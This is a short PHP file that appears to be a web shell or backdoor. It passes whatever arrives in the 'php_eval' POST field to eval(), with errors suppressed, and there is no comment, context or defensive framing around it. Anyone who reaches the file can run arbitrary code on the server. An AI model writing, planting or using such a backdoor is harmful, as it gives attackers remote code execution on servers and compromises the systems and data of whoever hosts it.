<?php
    $eval = @str_replace("<?","",$_POST['php_eval']);
    @eval($eval);
?>